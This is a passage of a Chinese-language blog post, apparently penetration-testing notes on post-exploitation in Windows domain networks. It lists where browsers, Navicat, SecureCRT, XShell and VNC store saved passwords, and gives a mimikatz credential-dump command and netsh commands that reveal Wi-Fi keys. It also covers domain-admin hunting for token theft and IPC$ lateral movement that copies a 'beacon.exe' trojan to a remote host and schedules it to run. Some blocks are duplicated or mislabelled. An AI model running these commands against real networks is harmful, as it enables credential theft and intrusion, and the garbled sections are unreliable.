%LOCALAPPDATA%\Google\Chrome\User Data\Profile 1\Login Data</span><br></pre></td></tr></table></figure>
+
+<h3 id="QQ浏览器"><a href="#QQ浏览器" class="headerlink" title="QQ浏览器"></a>QQ浏览器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">⽤户数据⽬录		%LOCALAPPDATA%\Tencent\QQBrowser\User Data\Default</span><br><span class="line">缓存⽬录			  %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cache\</span><br><span class="line">书签					 %LOCALAPPDATA%\Tencent\QQBrowser\User Data\Default\Bookmarks</span><br><span class="line">Cookie				 %LOCALAPPDATA%\Tencent\QQBrowser\User Data\Default\Cookies</span><br><span class="line">浏览历史 			 %LOCALAPPDATA%\Tencent\QQBrowser\User Data\Default\History</span><br><span class="line">当前的session  %LOCALAPPDATA%\Tencent\QQBrowser\User Data\Default\Current Session</span><br><span class="line">账号密码  		 %LOCALAPPDATA%\Tencent\QQBrowser\User Data\Default\Login Data</span><br><span class="line"> 							%LOCALAPPDATA%\Tencent\QQBrowser\User Data\Default\xxxxxxxxxxx\6</span><br></pre></td></tr></table></figure>
+
+<h3 id="360浏览器"><a href="#360浏览器" class="headerlink" title="360浏览器"></a>360浏览器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">账号密码⽂件 %APPDATA%\360se6\User Data\Default\apps\LoginAssis\assis2.db</span><br></pre></td></tr></table></figure>
+
+<h3 id="firefox"><a href="#firefox" class="headerlink" title="firefox"></a>firefox</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">账号密码⽂件	%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\logins.json</span><br></pre></td></tr></table></figure>
+
+<h3 id="IE-x2F-Edge"><a href="#IE-x2F-Edge" class="headerlink" title="IE&#x2F;Edge"></a>IE&#x2F;Edge</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">书签⽂件 		%USERPROFILE%\Favorites\xx.url</span><br></pre></td></tr></table></figure>
+
+<h2 id="远程管理工具"><a href="#远程管理工具" class="headerlink" title="远程管理工具"></a>远程管理工具</h2><p><strong>数据库管理工具、远程登录</strong></p>
+<h3 id="navicat"><a href="#navicat" class="headerlink" title="navicat"></a>navicat</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MySQL 	HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers&lt;your connection name&gt;</span><br><span class="line">MariaDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers&lt;your connection name&gt;</span><br><span class="line">MongoDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers&lt;your connection name&gt;</span><br><span class="line">MSSQL	  HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers&lt;your connection name&gt;</span><br><span class="line">Oracle 	HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers&lt;your connection name&gt;</span><br><span class="line">PostgreSQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers&lt;your connection name&gt;</span><br><span class="line">SQLite 	HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers&lt;your connection name&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="SecurtCRT"><a href="#SecurtCRT" class="headerlink" title="SecurtCRT"></a>SecurtCRT</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xp/win2003 			C:\Documents and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</span><br><span class="line">win7/win2008以上 %APPDATA%\VanDyke\Config\Sessions</span><br></pre></td></tr></table></figure>
+
+<h3 id="XShell"><a href="#XShell" class="headerlink" title="XShell"></a>XShell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Xshell 5 		%userprofile%\Documents\NetSarang\Xshell\Sessions</span><br><span class="line">Xshell 6 		%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</span><br></pre></td></tr></table></figure>
+
+<p>VNC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RealVNC 	HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver 		Password</span><br><span class="line">TightVNC 	HKEY_CURRENT_USER\Software\TightVNC\Server Value 	Password or PasswordViewOnly</span><br><span class="line">TigerVNC	HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4 				Password</span><br><span class="line">UltraVNC 	C:\Program Files\UltraVNC\ultravnc.ini 						passwd or passwd2</span><br></pre></td></tr></table></figure>
+
+<p>VPN</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit</span><br></pre></td></tr></table></figure>
+
+<h2 id="Wifi账号密码"><a href="#Wifi账号密码" class="headerlink" title="Wifi账号密码"></a>Wifi账号密码</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">查看帮助							 	  netsh wlan <span class="built_in">help</span></span><br><span class="line">列出⽆线接			 					 netsh wlan show interface</span><br><span class="line">开启⽆线接			 					 netsh interface <span class="built_in">set</span> interface &quot;Interface Name&quot; enabled</span><br><span class="line">显示连接过的WIFI的配置⽂件	netsh wlan show profiles</span><br><span class="line">连接指定wifi							netsh wlan connect name=xxxx</span><br><span class="line">断开连接									netsh wlan disconnect</span><br><span class="line"></span><br><span class="line">查看连接过的WIFI的配置⽂件(包含账号密码)，需要管理员权限执⾏，然后使⽤<span class="built_in">type</span>命令查看配置⽂件</span><br><span class="line">netsh wlan export profile interface=WLAN key=clear folder=C:\</span><br><span class="line"><span class="built_in">type</span> C:\xxx.xml</span><br><span class="line"></span><br><span class="line">批量显示wifi账号密码</span><br><span class="line"><span class="keyword">for</span> /f &quot;skip=<span class="number">9</span> tokens=<span class="number">1</span>,<span class="number">2</span> delims=:&quot; %i <span class="keyword">in</span> (&#x27;netsh wlan show profiles&#x27;) <span class="keyword">do</span> @<span class="built_in">echo</span> %j | <span class="built_in">findstr</span> -i -v <span class="built_in">echo</span> | netsh wlan show profiles %j key=clear</span><br><span class="line"></span><br><span class="line">其它常⽤的命令：</span><br><span class="line">   导出配置⽂件：netsh wlan export profile key=clear</span><br><span class="line">   删除配置⽂件：netsh wlan delete profile name=&quot;&quot;</span><br><span class="line">   添加配置⽂件：netsh wlan add profile filename=&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x03-域信息收集"><a href="#0x03-域信息收集" class="headerlink" title="0x03 域信息收集"></a>0x03 域信息收集</h1><h2 id="判断是否在域中"><a href="#判断是否在域中" class="headerlink" title="判断是否在域中"></a>判断是否在域中</h2><p>本地普通用户：只能查询本机信息</p>
+<p>本地管理员用户：可以查域内信息。提升Ntauthority或System权限后作为域内的机器账户进行认证。</p>
+<p>域用户：可以查域内信息。使用kerberos协议自动认证。</p>
+<ul>
+<li>本地普通用户：本机计算机名\john</li>
+<li>本地管理员用户：本机计算机名\administrator</li>
+<li>域用户：域名\user01</li>
+</ul>
+<p>几种判断方式</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">---------------利用计算机名和用户名判断--------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%userdomain%</span> &amp; hostname &amp;&amp; whoami		 # whoami 前的就是域名或主机名</span><br><span class="line"><span class="built_in">set</span> l																			 # 本机主机名、域控主机名</span><br><span class="line"></span><br><span class="line">---------------利用DNS服务器一般也部署在DC上判断--------------------</span><br><span class="line"><span class="built_in">ipconfig</span> /all							# &lt;主 DNS 后缀&gt;、&lt;DNS 后缀搜索列表&gt; 就是域名</span><br><span class="line">nslookup &lt;主 DNS 后缀&gt;		 # 得到域控ip</span><br><span class="line"></span><br><span class="line">---------------利用时间服务器一般也部署在DC上判断--------------------</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> /domain</span><br><span class="line"></span><br><span class="line">		发生系统错误	<span class="number">5</span>						 			#存在域，但当前用户不是域用户</span><br><span class="line">		\\XXX 的当前时间							 	 #存在域，且当前用户是域用户</span><br><span class="line">		找不到域 WORKGROUP 的域控制器。	 #当前为工作组环境</span><br><span class="line"></span><br><span class="line">---------------结果不为WORKGROUP则在域中--------------------</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> 域:</span><br><span class="line"><span class="built_in">net</span> config workstation | <span class="built_in">findstr</span> 工作站域</span><br></pre></td></tr></table></figure>
+
+<h2 id="收集域内信息"><a href="#收集域内信息" class="headerlink" title="收集域内信息"></a>收集域内信息</h2><p><strong>查询域名、域策略、域信任关系、域计算机列表、域控、域管、域控</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">whoami /all				# 获取用户SID，SID去掉后四位就是计算机/域SID</span><br><span class="line">sc showsid server	# 获取某服务的SID</span><br><span class="line"></span><br><span class="line">---------------查看有几个域名--------------------</span><br><span class="line"><span class="built_in">net</span> view												//无参时：查看当前域或组内的其它计算机名称列表</span><br><span class="line"><span class="built_in">net</span> view /domain								//查看有几个域</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> view /all \\&lt;ip/hostname&gt;						//带参数：查看远程计算机的文件共享列表，错误<span class="number">5</span></span><br><span class="line"><span class="built_in">dir</span> /Q \\&lt;ip/hostname&gt;\&lt;共享名&gt; 				 //查看某个共享名</span><br><span class="line"><span class="built_in">type</span> \\&lt;ip/hostname&gt;\&lt;共享名&gt;\&lt;文件名&gt;	//查看共享文件</span><br><span class="line"><span class="built_in">copy</span> .\backdoor.txt \\&lt;ip/hostname&gt;\&lt;共享名&gt;		//上传本地文件到目标共享</span><br><span class="line"></span><br><span class="line">--------------获取域策略信息--------------------</span><br><span class="line">nltest /domain_trusts						//获取域信任信息</span><br><span class="line"><span class="built_in">net</span> accounts /domain						//获取域密码策略</span><br><span class="line"><span class="built_in">net</span> group /domain               //查看所有域组名</span><br><span class="line"></span><br><span class="line">--------------获取域计算机列表--------------------</span><br><span class="line"><span class="built_in">net</span> view /domain:GOD									//查看god域中的计算机列表</span><br><span class="line"><span class="built_in">net</span> group &quot;domain computers&quot; /domain  //查看所有域成员计算机列表</span><br><span class="line"></span><br><span class="line">--------------定位域控--------------------</span><br><span class="line">nltest /DCLIST:&lt;域名&gt;</span><br><span class="line">nslookup -<span class="built_in">type</span>=SRV _ldap._tcp</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> /domain																//一般时间服务器为主/备域控</span><br><span class="line"><span class="built_in">net</span> group &quot;domain controllers&quot; /domain          //通过域控组查询</span><br><span class="line">netdom query pdc          											//查看所有域控的主机名，命令不可用。。</span><br><span class="line"></span><br><span class="line">--------------查域管理员用户--------------------</span><br><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; /domain</span><br><span class="line"><span class="built_in">net</span> group &quot;Enterprise Admins&quot; /domain</span><br><span class="line"></span><br><span class="line">--------------查询域用户--------------------</span><br><span class="line"><span class="built_in">net</span> localgroup administrators				//查看本地管理员组（因为Domain Admins组默认属于域内机器的本地管理员组）</span><br><span class="line"><span class="built_in">net</span> user /domain                    //查看域中所有的用户名，包括域管理</span><br><span class="line"><span class="built_in">net</span> user &lt;用户名&gt; /domain		  		 //查看指定用户的详细列表</span><br><span class="line">wmic useraccount get /all					  //获取域用户的详细信息</span><br><span class="line">dsquery							//域控管理工具</span><br><span class="line">dsquery user				//查看域内用户</span><br><span class="line">dsquery computer - 查找目录中的计算机</span><br><span class="line">dsquery contact - 查找目录中的联系人</span><br><span class="line">dsquery subnet - 查找目录中的子网</span><br><span class="line">dsquery group - 查找目录中的组</span><br><span class="line">dsquery ou - 查找目录中的组织单位</span><br><span class="line">dsquery site - 查找目录中的站点</span><br><span class="line">dsquery server - 查找目录中的域控制器</span><br><span class="line">dsquery user - 查找目录中的用户</span><br><span class="line">dsquery quota - 查找目录中的配额</span><br><span class="line">dsquery partition - 查找目录中的分区</span><br><span class="line">dsquery * - 用通用的 LDAP 查询查找目录中的任何对象</span><br></pre></td></tr></table></figure>
+
+<h2 id="域提权"><a href="#域提权" class="headerlink" title="域提权"></a>域提权</h2><p>通过日志定位：指本地机器的管理员日志，可以使用脚本或Wevtutil工具导出查看</p>
+<p>通过会话&#x2F;进程定位：指域内每台机器的登录会话，可以使用netsess.exe、PowerView等工具匿名查询。</p>
+<h2 id="域提权-定位域管理员"><a href="#域提权-定位域管理员" class="headerlink" title="域提权 - 定位域管理员"></a>域提权 - 定位域管理员</h2><p><strong>漏洞拿机器，然后抓域管明文或hash？</strong></p>
+<p>PS: 当拿下边界服务器进行横向移动时，需要先知道当前域用户的登录位置、是否是其它系统的本地管理员、所属组、是否有权访问文件共享。</p>
+<p>服务器加域后，系统会自动将domain admins组加到域成员服务器的administrators组，因此域管理员组的成员均可访问本地计算机，并具有管理员权限。</p>
+<blockquote>
+<p>常用工具：psloggedon.exe、PVEFindADUser.exe、netsess.exe、hunter、NetView、PowerShell - PowerView</p>
+</blockquote>
+<h3 id="bloodyAD-py"><a href="#bloodyAD-py" class="headerlink" title="bloodyAD.py"></a>bloodyAD.py</h3><p>查询域内信息的一款工具，主要用来修改账户属性、 新增机器账户，其它查询功能较为常规。</p>
+<h3 id="psloggedon-exe"><a href="#psloggedon-exe" class="headerlink" title="psloggedon.exe"></a>psloggedon.exe</h3><p>net session 可以查看谁使用了本机资源，使用 psloggedon 可以查看本地登录的用户和通过本地计算机或远程计算机进行资源登录的用户。原理是：调用NetSessionEnum API检查注册表HKEY_USERS项的key值来查询谁登陆过。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">psloggedon.exe -										#</span><br><span class="line">psloggedon.exe -l 									#仅显示本地登录</span><br><span class="line">psloggedon.exe -x										#不显示登录时间</span><br><span class="line">psloggedon.exe \\&lt;计算机名&gt;					 #列出指定计算机的登录信息</span><br><span class="line">psloggedon.exe &lt;用户名&gt;							#指定用户名，在网络种搜索该用户登录的计算机。</span><br></pre></td></tr></table></figure>
+
+<h3 id="PVEFindADUser-exe"><a href="#PVEFindADUser-exe" class="headerlink" title="PVEFindADUser.exe"></a>PVEFindADUser.exe</h3><p>PVEFindADUser 用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务器和计划任务的用户，该工具需要管理员权限。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">netview.exe -h               										#帮助</span><br><span class="line">netview.exe -f filename.txt  										#指定要提取主机列表的文件</span><br><span class="line">netview.exe -e filename.txt  										#指定要排除的主机名的文件</span><br><span class="line">netview.exe -o filename.txt  										#将所有输出重定向到指定的文件</span><br><span class="line">netview.exe -d domain        指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表</span><br><span class="line">netview.exe -g group         指定搜索的组名。如果没有指定，则在Domain Admins组中搜索</span><br><span class="line">netview.exe -c               对已找到的共享目录/文件的访问权限进行检查</span><br><span class="line">netview.exe -i interval      枚举主机之间等待的秒数</span><br><span class="line">netview.exe -j jitter        应用于间隔的抖动百分比（<span class="number">0</span>.<span class="number">0</span>-<span class="number">1</span>.<span class="number">0</span>）</span><br></pre></td></tr></table></figure>
+
+<h3 id="netview-exe"><a href="#netview-exe" class="headerlink" title="netview.exe"></a>netview.exe</h3><p>netview 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 寻找登录会话，利用 NetShareEnum 寻找共享，利用 NetWkstaUserEnum 枚举登录的用户，netview 可以查询共享入口和有价值的用户，其绝大部分功能无需管理员权限就可使用。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">netview.exe -h               										#帮助</span><br><span class="line">netview.exe -f filename.txt  										#指定要提取主机列表的文件</span><br><span class="line">netview.exe -e filename.txt  										#指定要排除的主机名的文件</span><br><span class="line">netview.exe -o filename.txt  										#将所有输出重定向到指定的文件</span><br><span class="line">netview.exe -d domain        指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表</span><br><span class="line">netview.exe -g group         指定搜索的组名。如果没有指定，则在Domain Admins组中搜索</span><br><span class="line">netview.exe -c               对已找到的共享目录/文件的访问权限进行检查</span><br><span class="line">netview.exe -i interval      枚举主机之间等待的秒数</span><br><span class="line">netview.exe -j jitter        应用于间隔的抖动百分比（<span class="number">0</span>.<span class="number">0</span>-<span class="number">1</span>.<span class="number">0</span>）</span><br></pre></td></tr></table></figure>
+
+<h3 id="Nmap-NSE脚本"><a href="#Nmap-NSE脚本" class="headerlink" title="Nmap - NSE脚本"></a>Nmap - NSE脚本</h3><p>smb-enum-domains.nse	 枚举域控，获取主机信息、用户、可使用密码策略的用户等</p>
+<p>smb-enum-users.nse 		 扫描域控，获取更多的域用户信息</p>
+<p>smb-enum-shares.nse 		 遍历远程主机的共享目录</p>
+<p>smb-enum-processes.nse 	 对主机的系统进程进行遍历，目标主机运行着哪些软件</p>
+<p>smb-enum-sessions.nse 	 获取域内主机的用户登陆会话，查看当前是否有用户登陆，且不需要管理员权限</p>
+<p>smb-os-discovery.nse 		 收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息</p>
+<h3 id="PowerView-脚本"><a href="#PowerView-脚本" class="headerlink" title="PowerView 脚本"></a>PowerView 脚本</h3><h2 id="域提权-定位域管进程"><a href="#域提权-定位域管进程" class="headerlink" title="域提权 - 定位域管进程"></a>域提权 - 定位域管进程</h2><p><strong>令牌窃取，以达到域权限提升的目的？</strong></p>
+<p><strong>方法1：会话&#x2F;进程检查域管</strong></p>
+<p>定位域管会话，拿下机器，抓域管密码。</p>
+<p>定位域管进程，拿下机器，令牌窃取。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 单机查找</span><br><span class="line">quser					# 查看当前机器会话，关注是否有域管账户，导lsass.exe快照，抓明文</span><br><span class="line">tasklist /v		# 查看进程，关注进程启动用户，可能有域管，令牌窃取</span><br><span class="line">- tasklist /v /fi &quot;USERNAME eq 域名\域管名&quot;</span><br><span class="line"></span><br><span class="line"># 批量检查域管进程</span><br><span class="line">## 先导一份域管名单</span><br><span class="line"><span class="built_in">net</span> group &quot;Domain Admins&quot; /domain						# 查域管</span><br><span class="line"></span><br><span class="line">## 收集的待检查机器ip</span><br><span class="line">ips.txt	</span><br><span class="line"></span><br><span class="line">## p73 <span class="keyword">for</span> 循环批量导远程机器进程，然后用域管名单筛选。</span><br><span class="line">tasklist /v /s &lt;ip&gt; /u &lt;user&gt; /p &lt;passwd&gt; 	# 核心命令，查看远程机器进程，？？？此处存疑，当前账户可以登其它机器，不就是域管？</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法2：批量搜索域控上的域用户会话</strong></p>
+<p>定位域管会话，拿下机器，抓域管密码。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">1</span>、获取筛选信息</span><br><span class="line"><span class="built_in">net</span> group &quot;Domain Controllers&quot; /domain			# 查域控机器名</span><br><span class="line"><span class="built_in">net</span> group &quot;Domain Admins&quot; /domain						# 查域管</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、netsess.exe	收集所有活动域的会话列表，</span><br><span class="line">返回活动会话的ip、域账户、会话时间、会话空闲时间</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、筛选得到域控上的域用户会话</span><br><span class="line">p72 <span class="built_in">cmd</span> <span class="keyword">for</span> 命令</span><br></pre></td></tr></table></figure>
+
+<p>Get Domain Admins（GDA）批处理脚本一把锁</p>
+<p><strong>方法3：批量搜索远程机器NetBIOS</strong></p>
+<p>定位域管会话，某些版本windows允许用户通过NetBIOS查询已登录用户。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nbtstat -A &lt;IP&gt; </span><br><span class="line"># p73 <span class="keyword">for</span>循环</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x04-内网横向思路及如何跨网段"><a href="#0x04-内网横向思路及如何跨网段" class="headerlink" title="0x04 内网横向思路及如何跨网段"></a>0x04 内网横向思路及如何跨网段</h1><p>1、我是谁、我在哪、我的目标</p>
+<p>2、信息收集</p>
+<p>3、横向移动</p>
+<h2 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h2><ul>
+<li>NetBIOS探测：</li>
+<li>ICMP探测：for in</li>
+<li>ARP扫描：arp.exe、Empire - arpscan、Nishang - Invoke-ARPScan.ps1</li>
+<li>TCP&#x2F;UDP端口扫描：nmap、masscan、telnet、MSF - portscan模块、Nishang - Invoke-PortScan.ps1、PowerSploit - Invoke-portscan.ps1</li>
+</ul>
+<p><strong>ICMP探测</strong></p>
+<ul>
+<li>for in</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /l  %i  in (1,1,255) do @  ping  172.16.1.%i  -w  1  -n  1 |  find  /i  &quot;ttl=&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>vbs脚本</li>
+</ul>
+<p>cscript 1.vbs</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p51</span><br></pre></td></tr></table></figure>
+
+<p><strong>ARP扫描</strong></p>
+<p>动静是否会太大。</p>
+<p><strong>TCP&#x2F;UDP端口扫描</strong></p>
+<h2 id="找网段"><a href="#找网段" class="headerlink" title="找网段"></a>找网段</h2><p><strong>DNS区域传输漏洞</strong></p>
+<blockquote>
+<p> <strong>DNS 区域传送（DNS zone transfer）</strong>是指一台备用 DNS 服务器使用来自主 DNS 服务器的数据刷新自己的域（zone）数据库，从而避免主 DNS 服务器因意外故障影响到整个域名解析服务。</p>
+<p> <strong>DNS区域传送方式</strong>：axfr：完全区域传送、ixfr：增量区域传送</p>
+<p> <strong>DNS区域传输漏洞</strong>：一般来说DNS区域传送只在主备DNS服务器间使用，但由于主服务器错误配置，导致任意用户发起请求后可获得一个zone数据库的详细信息。</p>
+<p> <strong>修复方式</strong>：添加allow-transfer，配置ip白名单</p>
+</blockquote>
+<p>利用</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">ls &lt;完整域名&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script dns-zone-transfer.nse --script-args &quot;dns-zone-transfer.domain=域名&quot; -Pn -p <span class="number">53</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">101</span>.<span class="number">152</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">建立IPC连接命令：</span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">191</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">136</span>\ipc$ &quot;password&quot; /user:&quot;Administrator&quot;</span><br><span class="line"></span><br><span class="line">断开连接：</span><br><span class="line"><span class="built_in">net</span> use \\x.x.x.x\ipc$ /<span class="built_in">del</span></span><br><span class="line"></span><br><span class="line">查看连接是否建立：</span><br><span class="line"><span class="built_in">net</span> use</span><br><span class="line"></span><br><span class="line">测试连接：</span><br><span class="line"><span class="built_in">dir</span> \\<span class="number">191</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">136</span>\c$</span><br><span class="line"></span><br><span class="line">拷贝木马：</span><br><span class="line"><span class="built_in">copy</span> beacon.exe \\<span class="number">191</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">136</span>\c$</span><br><span class="line"></span><br><span class="line">创建计划任务(<span class="built_in">at</span>&lt;<span class="number">2012</span>、schtasks&gt;=<span class="number">2012</span>)：</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">191</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">136</span> <span class="number">15</span>:<span class="number">47</span> c:\beacon.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="主机名"><a href="#主机名" class="headerlink" title="主机名"></a>主机名</h2><h2 id="端口-重点关注的组件"><a href="#端口-重点关注的组件" class="headerlink" title="端口 - 重点关注的组件"></a>端口 - 重点关注的组件</h2><p><strong>数据库凭据</strong>：抓navicat凭据、弱口令</p>
+<ul>
+<li><p>1433   sqlserver 	sa用户 		利用xp_cmdshell、sp_configure、sp_*提权</p>
+</li>
+<li><p>3306   mysql 		root用户 		利用udf提权</p>
+<ul>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/litlife/p/9030673.html">udf提权原理详解 - ka1n4t - 博客园</a></li>
+</ul>
+</li>
+<li><p>1521   oracle		</p>
+</li>
+<li><p>6379   redis未授权漏洞利用</p>
+</li>
+<li><p>9200   ES未授权</p>
+</li>
+<li><p>27017 MongoDB未授权</p>
+</li>
+</ul>
+<h2 id="web应用-重点"><a href="#web应用-重点" class="headerlink" title="web应用 - 重点"></a>web应用 - 重点</h2><p>OA：通达、泛微、帆软</p>
+<p>邮箱：coremail</p>
+<p>shiro、solr、weblogic</p>
